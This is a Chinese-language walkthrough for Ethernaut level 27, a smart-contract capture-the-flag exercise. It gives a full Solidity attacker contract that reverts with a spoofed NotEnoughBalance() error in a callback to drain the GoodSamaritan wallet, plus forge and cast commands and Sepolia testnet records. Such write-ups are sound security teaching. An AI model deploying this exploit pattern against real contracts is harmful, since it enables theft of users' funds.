# Level 27

[The Ethernaut level 27](https://ethernaut.openzeppelin.com/level/27)

这一关的目的取出 `GoodSamaritan` 所有余额。

这一关比较简单，只需要攻击合约实现 `INotifyable` 接口，在 `notify` 回调函数中抛出 `NotEnoughBalance()` 错误即可骗过 `Wallet` 合约，使其认为余额不足，进而发送所有“剩余”余额。

攻击者合约：
```
contract Attacker is INotifyable {
    GoodSamaritan level;

    error NotEnoughBalance();

    constructor(address level_) public {
        level = GoodSamaritan(level_);
    }

    function attack() external {
        level.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount <= 10) revert NotEnoughBalance();
    }
}
```

执行脚本：
```
forge script script/Level27.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

完整代码见：[这里](../../ethernaut/script/Level27.s.sol)

查询攻击合约余额，返回 1000000([1e6])
```
cast call \
0xE58b63c367997C933557B4404e77F9A911A25bcF \
"balances(address)(uint256)" 0x89111a221475E3D0A5e48Cc501630637993Acce0 \
--rpc-url sepolia
```

链上记录：
- [level(`GoodSamaritan`)](https://sepolia.etherscan.io/address/0x28AF65c81B2a3EfaD0Af0ce2A019Fd6fc1604D24)
- [level(`Wallet`)](https://sepolia.etherscan.io/address/0xad8cF598BCfDb7465a5df16056ffc675b1B6ACAB)
- [level(`Coin`)](https://sepolia.etherscan.io/address/0xE58b63c367997C933557B4404e77F9A911A25bcF)
- [Attacker](https://sepolia.etherscan.io/address/0x89111a221475E3D0A5e48Cc501630637993Acce0)
- [attack 交易](https://sepolia.etherscan.io/tx/0x433d9650d7a05b0689973825f6eae03d112a20876824b846677f36ce1fe5b0e9)
